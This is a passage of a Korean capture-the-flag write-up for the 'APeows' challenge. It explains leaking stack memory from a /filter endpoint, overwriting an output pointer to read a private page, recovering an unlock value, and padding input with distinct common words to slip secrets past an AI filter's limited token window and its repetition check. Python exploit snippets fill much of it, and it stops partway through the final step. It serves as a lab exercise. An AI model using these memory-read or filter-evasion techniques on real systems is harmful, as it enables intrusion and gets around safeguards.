> 본문에 남은 호스트와 IP 주소는 대회 당시 제공된 CTF 환경이며, 현재 운영 상태와는 무관하다.

`APeows`는 AI 필터를 대상으로 한 문제였지만, 프롬프트만 수정해서 풀리는 구조는 아니었다. 처음 접속했을 때 `/` 경로에서는 `not found`만 나왔다.

실제 `/filter` API를 찾은 뒤 스택 데이터 노출, 비공개 페이지 읽기, unlock 값 복원까지 이어졌다. 마지막에는 **토큰 수를 특정 구간에 맞추는 것**이 관건이었다.

---

## 1. 문제 개요

- 분야: AI
- 문제명: APeows
- 점수: 496
- 접속 주소: `http://180.66.117.133:28712/`
- 최종 플래그: `CTF{b4nd3d_4tt3nt10n_bl1nd_sp0t_DtYFlpx1}`

처음 주소에 접속하면 다음 응답만 출력됐다.

```json
{
  "detail": "not found"
}
```

이는 서버가 내려간 것이 아니라 / 경로가 구현되지 않았기 때문이었다. 제공된 바이너리를 분석한 결과 실제 기능은 다음 엔드포인트에서 처리되고 있었다.

```http
POST /filter
```

## 2. 바이너리 정적 분석

바이너리의 문자열을 확인하면 /filter 요청에서 사용되는 필드와 여러 오류 메시지를 찾을 수 있었다.

```text
text must be a string
session must be a string
echo must be an integer from 0 to 160
unlock must be a string
unlock must be 16 hexadecimal characters
scope must be 32 hexadecimal characters
disclosure unavailable
peer rate limit exceeded
```

또한 다음 문자열이 특히 중요했다.

```text
every scope's unlock word and band are per-boot
secret heap copy
oos-disclosure
```

이를 통해 각 scope마다 다음 값들이 생성된다는 것을 알 수 있었다.

- 16자리 unlock 값
- 특정 토큰 수 구간인 band
- disclosure worker가 접근할 수 있는 비공개 메모리 페이지

요청 형식은 대략 다음과 같았다.

```json
{
  "text": "사용자 입력",
  "scope": "32자리 16진수",
  "session": "세션 데이터",
  "echo": 160,
  "unlock": "16자리 16진수"
}
```

## 3. Disclosure 기능의 스택 메모리 노출

session 필드를 처리하는 과정에는 길이 검사가 충분하지 않았다.

echo 값은 최대 160까지 지정할 수 있었고, 빈 session과 함께 요청하면 disclosure worker의 스택 일부가 응답에 포함됐다.

```python
{
    "text": "hello world",
    "scope": scope,
    "session": "",
    "echo": 160
}
```

응답의 disclosure 필드는 16진수 문자열 형태였다.

```python
leak = bytes.fromhex(response["disclosure"])
```

유출된 스택에서 다음 값을 찾을 수 있었다.

```python
ret = unpack64(leak[0x58:0x60])
private_page = unpack64(leak[0x90:0x98])
```

복귀 주소는 PIE 내부의 고정 오프셋을 가리켰으므로 PIE base도 계산할 수 있었다.

```python
pie_base = ret - 0x5f00
```

실제 실행 결과는 다음과 같았다.

```text
[+] PIE base     = 0x5eb064dcf000
[+] private page = 0x7858299d3000
```

## 4. 출력 포인터 덮어쓰기를 이용한 메모리 읽기

스택 프레임에는 disclosure 결과를 저장하는 출력 구조체가 존재했다.

이 구조체는 대략 다음 형태였다.

```c
struct output {
    void *ptr;
    size_t len;
};
```

유출된 스택의 앞부분을 그대로 보존한 뒤, 출력 구조체의 ptr과 len만 변경했다.

```python
prefix = leak[:0x80]

payload = (
    prefix
    + p64(private_page + offset)
    + p64(0x400)
)
```

- `leak[:0x80]`: 스택 카나리와 기존 프레임 값 보존
- `private_page + offset`: 읽을 메모리 주소
- `0x400`: 한 번에 읽을 길이

이를 0x400바이트씩 네 번 반복하면 private page 전체 0x1000바이트를 읽을 수 있다.

```python
for offset in range(0, 0x1000, 0x400):
    payload = prefix + p64(private_page + offset) + p64(0x400)
    chunk = disclosure(scope, payload)
    secret_page += chunk
```

읽은 데이터는 다음 파일로 저장했다.

```text
apeows_secret.bin
```

처음에는 이 페이지 안에 플래그 문자열이 직접 있을 것으로 예상했지만, 실제 내용은 대부분 랜덤 바이트처럼 보였다.

## 5. Private page에 숨겨진 unlock 값 복구

private page는 단순한 랜덤 데이터가 아니었다.

앞부분에는 8바이트 정수 480개가 존재했고, 그중 정확히 하나가 다음 조건을 만족하도록 구성돼 있었다.

```text
((value >> 32) % 480) == index
```

즉, 각 위치 i에 대해 8바이트 값을 little-endian으로 읽고 다음 검사를 수행했다.

```python
for i in range(480):
    value = unpack64(page[i * 8 : i * 8 + 8])

    if value != 0 and ((value >> 32) % 480) == i:
        print(i, hex(value))
```

일반 랜덤 값들은 이 조건을 만족하지 않도록 조정되어 있었고, 실제 unlock 값만 자신의 계산된 인덱스에 삽입되어 있었다.

실행 결과:

```text
[+] marker index = 331
[+] unlock       = 79c93dcb39dc08f9
```

따라서 해당 scope의 unlock 값은 다음과 같았다.

```text
79c93dcb39dc08f9
```

## 6. Unlock 값으로 토큰 band 계산

unlock 값은 인증에만 사용되는 것이 아니라, AI 필터의 토큰 band를 계산하는 데도 사용됐다.

분석한 계산식은 다음과 같았다.

```python
width = 3 + ((unlock_value >> 8) & 1)
divisor = 9 - width

user_low = 0xD7 + (unlock_value % divisor)
user_high = user_low + width - 1
```

복구한 unlock 값을 넣으면 다음 결과가 나왔다.

```text
[+] user tokens = 216..218
```

즉, 사용자 입력의 토큰 수가 약 216~218개가 되도록 맞춰야 비밀 데이터가 AI 처리 과정의 특정 band에 위치하게 된다.

이 부분이 플래그의 문구인 다음 내용과 연결된다.

```text
banded attention blind spot
```

필터가 전체 입력을 완전하게 검사하는 것이 아니라 제한된 토큰 구간을 중심으로 검사하면서, 특정 정렬에서는 비밀 영역이 필터의 감시 범위에서 벗어나게 된다.

## 7. 반복 입력 검사 우회

처음에는 토큰 수를 정확히 맞추기 위해 한 글자짜리 입력을 반복해서 전송했다.

```text
a b c a b c ...
```

하지만 서버는 이를 감지하여 다음 오류를 반환했다.

```text
HTTP 422: input too repetitive
```

따라서 동일한 단어를 반복하는 대신 서로 다른 고빈도 영어 단어를 사용했다.

예를 들면 다음과 같다.

```text
the of and to in is that for it with by on not this are ...
```

단어들은 대부분 일반적인 토크나이저에서 한 개의 토큰으로 처리되며, 서로 다른 단어를 사용하기 때문에 반복성 검사도 통과할 수 있다.

Python에서는 단어 목록을 섞은 뒤 필요한 개수만 선택했다.

```python
def make_text(word_count, seed):
    words = list(dict.fromkeys(COMMON_WORDS))

    random.Random(seed).shuffle(words)

    return " ".join(words[:word_count])
```

먼저 216개 단어로 요청하고, 토크나이저의 특수 토큰 처리 차이를 고려해 주변 개수도 후보로 두었다.

```python
probe_counts = [
    user_low,
    user_low - 2,
    user_low - 1,
    user_low + 1
]
```
